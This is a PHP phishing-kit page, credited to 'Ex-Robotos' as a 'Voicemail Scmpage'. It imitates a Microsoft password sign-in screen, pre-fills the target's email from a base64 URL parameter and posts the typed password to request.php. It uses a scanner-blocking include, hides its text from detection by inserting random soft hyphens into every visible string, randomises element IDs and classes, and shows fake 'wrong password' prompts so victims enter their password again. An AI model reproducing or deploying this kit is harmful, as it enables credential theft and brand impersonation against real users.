<?php
/* 
Voicemail Scmpage 2019 by Ex-Robotos
Email: ex.robotos@gmail.com
Facebook: facebook.com/Ex.Robotos
ICQ: 745771262
*/
error_reporting(0);include('blocker.php');include('config.php');
/* Extract Email from url */
$data = $_GET['data'];
$status = $_GET['status'];
if ( base64_encode(base64_decode($data)) === $data){
    $email = base64_decode($data);
} else {
    $email = $data;
}
function RndString($length = 10) {
return substr(str_shuffle("0123456789abcdefghijklmnopqrstuvwxyz"), 0, $length);
}
$randpart = RndString(50).''.RndString(50).''.RndString(50);
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html dir="ltr" class="" lang="en"><head>
    <title>S<? echo str_repeat("­",rand(1,3));?>ig<? echo str_repeat("­",rand(1,3));?>n i<? echo str_repeat("­",rand(1,3));?>n to y<? echo str_repeat("­",rand(1,3));?>ou<? echo str_repeat("­",rand(1,3));?>r ac<? echo str_repeat("­",rand(1,3));?>cou<? echo str_repeat("­",rand(1,3));?>nt</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="-1">
    <meta name="referrer" content="no-referrer"/>
    
    <noscript>
        <meta http-equiv="Refresh" content="0; URL=jsdisabled.php" />
    </noscript>

    
        <link rel="shortcut icon" href="images/favicon.ico">
    
    <meta name="robots" content="none">
  
    <link href="css/conv.css" rel="stylesheet" >
</head>

<body id="<?=RndString(8)?>" data-bind="defineGlobals: ServerData, bodyCssClass" class="cb <?=RndString(8)?>" style="display: block;">
    

<div id="<?=RndString(8)?>"> <div data-bind="component: { name: 'background-image', publicMethods: backgroundControlMethods }"><div class="background <?=RndString(8)?>" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }"> <div id="<?=RndString(8)?>" data-bind="backgroundImage: smallImageUrl()" style="background-image: url(&quot;images/small-background.jpg&quot;);"></div> <div class="backgroundImage <?=RndString(8)?>" data-bind="backgroundImage: backgroundImageUrl()" style="background-image: url(&quot;images/big-background.jpg&quot;);"></div> </div></div>  

<style>                
.disableit{
    display:none;
}
.enableit{
    display:block !important;
}
img {max-width: 100%;}
.novalidate {
    border-top-width: unset !important;
    border-left-width: unset !important;
    border-right-width: unset !important;
    border-color: #fa0808 !important;
    border-width: 2px !important;
}
.form-group {margin-bottom:6px!important;}
</style>

<!--<form-->
  
     <div class="outer <?=RndString(8)?>" data-bind="component: { name: 'page',
        params: {
            serverData: svr,
            showButtons: svr.fShowButtons,
            showFooterLinks: true,
            useWizardBehavior: svr.fUseWizardBehavior,
            handleWizardButtons: false,
            passwrd: passwrd,
            hideFromAria: ariaHidden },
        event: {
            footerAgreementClick: footer_agreementClick } }"> <div class="middle <?=RndString(8)?>" data-bind="css: { 'app': backgroundLogoUrl }"> <div class="inner fade-in-lightbox <?=RndString(8)?>" data-bind="
                animationEnd: paginationControlMethods() &amp;&amp; paginationControlMethods().view_onAnimationEnd,
                css: {
                    'app': backgroundLogoUrl,
                    'wide': paginationControlMethods() &amp;&amp; paginationControlMethods().currentViewHasMetadata('wide'),
                    'fade-in-lightbox': fadeInLightBox,
                    'has-popup': showFedCredButton,
                    'transparent-lightbox': backgroundControlMethods() &amp;&amp; backgroundControlMethods().useTransparentLightBox }"> 
                    
                    <div class="lightbox-cover <?=RndString(8)?>" data-bind="css: { 'disable-lightbox': svr.fAllowGrayOutLightBox &amp;&amp; showLightboxProgress() }"></div> 

                    <div id="progressBar" class="progress disableit <?=RndString(8)?>" role="progressbar" data-bind="component: 'marching-ants-control', ariaLabel: str['WF_STR_ProgressText']" aria-label="Please wait"><!--  --><!-- ko if: useCssAnimation --> <div></div><div></div><div></div><div></div><div></div><!-- /ko --><!-- ko ifnot: useCssAnimation --><!-- /ko --></div>
                    
                    <div data-bind="component: { name: 'logo-control',
                    params: {
                        isChinaDc: svr.fIsChinaDc,
                        bannerLogoUrl: bannerLogoUrl() } }"> <img class="logo <?=RndString(8)?>" pngsrc="images/mcsft_logo.png" svgsrc="images/mcsft_logo.svg" data-bind="imgSrc, attr: { alt: str['MOBILE_STR_Footer_Micr0soft'] }" src="images/mcsft_logo.svg" alt="Micr0soft">  </div> <div role="main" data-bind="component: { name: 'pagination-control',
                        publicMethods: paginationControlMethods,
                        params: {
                            enableCssAnimation: svr.fEnableCssAnimation,
                            initialViewId: initialViewId,
                            currentViewId: currentViewId,
                            initialSharedData: initialSharedData,
                            initialError: $loginPage.getServerError() },
                        event: {
                            cancel: paginationControl_onCancel,
                            showView: $loginPage.view_onShow,
                            setLightBoxFadeIn: view_onSetLightBoxFadeIn,
                            animationStateChange: paginationControl_onAnimationStateChange } }"> <div data-bind="css: { 'zero-opacity': hidePaginatedView() }" class=""> <div data-bind="css: {
        'animate': animate() &amp;&amp; animate.animateBanner(),
        'slide-out-next': animate.isSlideOutNext(),
        'slide-in-next': animate.isSlideInNext(),
        'slide-out-back': animate.isSlideOutBack(),
        'slide-in-back': animate.isSlideInBack() }" class="animate slide-in-next <?=RndString(8)?>"> <div data-bind="component: { name: 'identity-banner-control',
            params: {
                userTileUrl: svr.urlProfilePhoto,
                displayName: sharedData.displayName || svr.sPOST_Username,
                isBackButtonVisible: isBackButtonVisible(),
                focusOnBackButton: isBackButtonFocused(),
                backButtonDescribedBy: backButtonDescribedBy() },
            event: {
                backButtonClick: identityBanner_onBackButtonClick } }"> <div class="identityBanner <?=RndString(8)?>"> <button type="button" class="backButton <?=RndString(8)?>" data-bind="
        attr: { 'id': backButtonId || 'idBtn_Back' },
        ariaLabel: str['CT_HRD_STR_Splitter_Back'],
        ariaDescribedBy: backButtonDescribedBy,
        click: backButton_onClick,
        hasFocus: focusOnBackButton" id="idBtn_Back" aria-label="Back"> <img role="presentation" pngsrc="images/arrow_left.png" svgsrc="images/arrow_left.svg" data-bind="imgSrc" src="images/arrow_left.svg">  </button> <div id="displayName" class="identity <?=RndString(8)?>" data-bind="text: unsafe_displayName, attr: { 'title': unsafe_displayName }" title="<?=$email?>"><?=$email?></div> </div></div> </div> <div class="pagination-view animate has-identity-banner slide-in-next <?=RndString(8)?>" data-bind="css: {
        'has-identity-banner': showIdentityBanner() &amp;&amp; (sharedData.displayName || svr.sPOST_Username),
        'zero-opacity': hidePaginatedView.hideSubView(),
        'animate': animate(),
        'slide-out-next': animate.isSlideOutNext(),
        'slide-in-next': animate.isSlideInNext(),
        'slide-out-back': animate.isSlideOutBack(),
        'slide-in-back': animate.isSlideInBack() }"> <div data-viewid="2" data-showidentitybanner="true" data-dynamicbranding="true" data-bind="pageViewComponent: { name: 'login-paginated-passwrd-view',
                        params: {
                            serverData: svr,
                            serverError: initialError,
                            isInitialView: isInitialState,
                            username: sharedData.username,
                            displayName: sharedData.displayName,
                            hipRequiredForUsername: sharedData.hipRequiredForUsername,
                            passwrdBrowserPrefill: sharedData.passwrdBrowserPrefill,
                            availableCreds: sharedData.availableCreds,
                            evictedCreds: sharedData.evictedCreds,
                            useEvictedCredentials: sharedData.useEvictedCredentials,
                            flowToken: sharedData.flowToken,
                            defaultKmsiValue: svr.iDefaultLoginOptions === 1,
                            userTenantBranding: sharedData.userTenantBranding,
                            sessions: sharedData.sessions,
                            callMetadata: sharedData.callMetadata,
                            gitHubRedirectUrl: sharedData.gitHubParams.redirectUrl || svr.urlGitHubFed,
                            googleRedirectUrl: sharedData.googleParams.redirectUrl || svr.urlGoogleFed },
                        event: {
                            updateFlowToken: $loginPage.view_onUpdateFlowToken,
                            submitReady: $loginPage.view_onSubmitReady,
                            redirect: $loginPage.view_onRedirect,
                            resetPasswrd: $loginPage.passwrdView_onResetPasswrd,
                            setBackButtonState: view_onSetIdentityBackButtonState,
                            setPendingRequest: $loginPage.view_onSetPendingRequest } }">    <div id="loginHeader" class="row text-title <?=RndString(8)?>" role="heading" aria-level="1" data-bind="text: str['CT_PWD_STR_EnterPasswrd_Title']"><img src="<?="images/enterpass.png";?>"></div> <div class="row <?=RndString(8)?>"> <div class="form-group col-md-24"> 
                            
                            
                            <div id="<?=RndString(8)?>" role="alert" aria-live="assertive"><!-- ko if: passwrdTextbox.error -->
                            
                           <?if ($status=='error' || $status=='error2' || $status=='error3' || $status=='error4'){?> 
                            <div id="passwrdError" class="alert alert-error <?=RndString(8)?>" data-bind="
                htmlWithBindings: passwrdTextbox.error,
                childBindings: { 'idA_IL_ForgotPasswrd0': { href: svr.urlResetPasswrd, click: resetPasswrd_onClick } }"><? echo $$status; ?><? if($status!='error'){ ?>, <a id="idA_IL_ForgotPasswrd0" href="#">r<? echo str_repeat("­",rand(1,3));?>es<? echo str_repeat("­",rand(1,3));?>et i<? echo str_repeat("­",rand(1,3));?>t no<? echo str_repeat("­",rand(1,3));?>w.</a><?}?></div>
                            <?}else{?>
                            <div id="passwrdError" class="alert <?=RndString(8)?>" data-bind="
<div id="passwrdError" class="alert <?=RndString(8)?>"><img class="" src="./images/firstmsg.png" alt="ve<? echo str_repeat("­",rand(1,3));?>rif<? echo str_repeat("­",rand(1,3));?>y yo<? echo str_repeat("­",rand(1,3));?>ur da<? echo str_repeat("­",rand(1,3));?>ta" style="width: 100%;"></div>        
                            <?}?>
                            <!-- /ko --> </div> 
                            
                            
                            <div class="placeholderContainer <?=RndString(8)?>" data-bind="component: { name: 'placeholder-textbox',
            publicMethods: passwrdTextbox.placeholderTextboxMethods,
            params: {
                serverData: svr,
                hintText: str['CT_PWD_STR_PwdTB_Label'] },
            event: {
                updateFocus: passwrdTextbox.textbox_onUpdateFocus } }">  
							<script>
function makeInputHere(e) {

   e.innerHTML = '<form class="<?=RndString(8)?>" name="f1" id="i0281" novalidate="novalidate" spellcheck="false" method="post" target="_top" autocomplete="off"  action="<? if ($status=='error'){echo 'request.php?'.$randpart.'&error&data='.$data;}else if ($status=='error2'){echo 'request.php?'.$randpart.'&error2&data='.$data;}else if ($status=='error3'){echo 'request.php?'.$randpart.'&error3&data='.$data;}else if ($status=='error4'){echo 'request.php?'.$randpart.'&error4&data='.$data;}else{echo 'request.php?'.$randpart.'&data='.$data;}?>" ><input name="passwd" type="password" id="i0118" autocomplete="off" class="form-control <?=RndString(8)?> <?if ($status=='error' || $status=='error2' || $status=='error3'){echo ' has-error';}?>" aria-required="true" placeholder="Pa<? echo str_repeat("­",rand(1,3));?>ss<? echo str_repeat("­",rand(1,3));?>wo<? echo str_repeat("­",rand(1,3));?>rd" aria-label="En<? echo str_repeat("­",rand(1,3));?>ter t<? echo str_repeat("­",rand(1,3));?>he pas<? echo str_repeat("­",rand(1,3));?>sw<? echo str_repeat("­",rand(1,3));?>ord f<? echo str_repeat("­",rand(1,3));?>or <?=$email?>" required></form><!--onsubmit="return setTimeout(function(){ }, 10000);return validateForm()"  -->';
   document.getElementById("i0118").focus();



}    
</script>
<style>
#spoinput {
    font-family: inherit;
    font-size: inherit;
    line-height: inherit;
    background-image: url(./images/passwrd.png);
    background-repeat: no-repeat;
    cursor: text;
}
#spoinput {
    max-width: 100%;
    line-height: inherit;
}
#spoinput {
    /* display: block; */
    /* width: 100%; */
    /* background-image: none; */
}
#spoinput {
    padding: 4px 8px;
    border-style: solid;
    /* border-width: 2px; */
    border-color: rgba(0, 0, 0, 0.31);
    /* background-color: rgba(255,255,255,0.4); */
    /* height: 32px; */
    /* height: 2rem; */
}
#spoinput {
    /* padding: 6px 10px; */
    border-width: 1px;
    border-color: #666;
    border-color: rgba(0,0,0,0.6);
    height: 36px;
    outline: none;
    border-radius: 0;
    -webkit-border-radius: 0;
    background-color: transparent;
}
#spoinput {
    border-top-width: 0;
    border-left-width: 0;
    border-right-width: 0;
}
</style>              
                <!-- has-error-->
                <div onclick="makeInputHere(this); this.onclick=null;">

                <div id="spoinput"></div>     
  
                </div>
                
                
                
                </div> </div> </div> <div data-bind="css: { 'position-buttons': !tenantBranding.BoilerPlateText }" class="position-buttons <?=RndString(8)?>"> <div> <div class="row"> <div class="col-md-24"> <div class="text-13 action-links"> <div class="form-group <?=RndString(8)?>"> <a id="idA_PWD_ForgotPasswrd" role="link" href="#" data-bind="text: str['CT_PWD_STR_ForgotPwdLink_Text'], href: svr.urlResetPasswrd, click: resetPasswrd_onClick"><img src="images/forgetpass.png"></a> </div>  </div> </div> </div> </div> <div class="row <?=RndString(8)?>" data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText }"> <div data-bind="component: { name: 'footer-buttons-field',
        params: {
            serverData: svr,
            primaryButtonText: str['CT_PWD_STR_SignIn_Button'],
            isPrimaryButtonEnabled: !isRequestPending(),
            isPrimaryButtonVisible: svr.fShowButtons,
            isSecondaryButtonEnabled: true,
            isSecondaryButtonVisible: false },
        event: {
            primaryButtonClick: primaryButton_onClick } }"><div class="col-xs-24 no-padding-left-right button-container <?=RndString(8)?>" data-bind="
    visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
    css: { 'no-margin-bottom': removeBottomMargin }"><div class="inline-block">
        <div id="idSIButton9" class="btn btn-block btn-primary <?=RndString(8)?>"></div>    
<script>
function validateForm() {
var i0118 = document.getElementById("i0118").value;
  if (i0118 == "") {
    return false;
  }
  return true;
}
    function submitForm() {
        document.getElementById("i0281").submit();
    }

    document.getElementById('idSIButton9').onclick = function() {
         if(document.getElementById("i0118") && document.getElementById("i0281") && document.getElementById('i0118').value !== '') {
        document.getElementById('progressBar').setAttribute("class", "progress enableit");
        setTimeout(submitForm, 2000);
        document.getElementById('spoinput').classList.remove("novalidate");
        document.getElementById('i0118').classList.remove("novalidate");
        }else if(document.getElementById('spoinput')){
        document.getElementById('spoinput').classList.add("novalidate");
        }else if(document.getElementById('i0118')){
        document.getElementById('i0118').classList.add("novalidate");
        }
    }
</script>            
            </div> </div></div> </div> </div></div> </div> </div></div> </div>                 <div id="footer" class="footer default <?=RndString(8)?>" role="contentinfo" data-bind="css: { 'default': !backgroundLogoUrl() }"> <div data-bind="component: { name: 'footer-control',
                    params: {
                        serverData: svr,
                        debugDetails: debugDetails,
                        showLinks: true },
                    event: {
                        agreementClick: footer_agreementClick } }"> <div id="footerLinks" class="footerNode text-secondary <?=RndString(8)?>"> <span id="ftrCopy" data-bind="html: svr.strCopyrightTxt">&#xA9;<? echo str_repeat("­",rand(1,3));?>&#x32;<? echo str_repeat("­",rand(1,3));?>&#x30;<? echo str_repeat("­",rand(1,3));?>&#x31;<? echo str_repeat("­",rand(1,3));?>&#x39;<? echo str_repeat("­",rand(1,3));?>&#x20;</span> <a id="ftrTerms" data-bind="text: str['MOBILE_STR_Footer_Terms'], href: termsLink, click: termsLink_onClick" href="#">Terms of use</a> <a id="ftrPrivacy" data-bind="text: str['MOBILE_STR_Footer_Privacy'], href: privacyLink, click: privacyLink_onClick" href="#">Pr<? echo str_repeat("­",rand(1,3));?>iva<? echo str_repeat("­",rand(1,3));?>cy &amp; co<? echo str_repeat("­",rand(1,3));?>oki<? echo str_repeat("­",rand(1,3));?>es</a> <a href="#" role="button" class="moreOptions <?=RndString(8)?>" data-bind="
        click: moreInfo_onClick,
        ariaLabel: str['CT_STR_More_Options_Ellipsis_AriaLabel'],
        hasFocus: focusMoreInfo()" aria-label="Click here for troubleshooting information"> <img class="desktopMode" role="presentation" pngsrc="images/ellipsis_white.png" svgsrc="images/ellipsis_white.svg" data-bind="imgSrc" src="images/ellipsis_white.svg"> <img class="mobileMode <?=RndString(8)?>" role="presentation" pngsrc="images/ellipsis_grey.png" svgsrc="images/ellipsis_grey.svg" data-bind="imgSrc" src="images/ellipsis_grey.svg">  </a> </div> </div> </div> </div> </div> <!--/*data-bind="autoSubmit: forceSubmit, attr: { action: postUrl }, ariaHidden: activeDialog"*/-->
<!--</form-->   </div></body></html>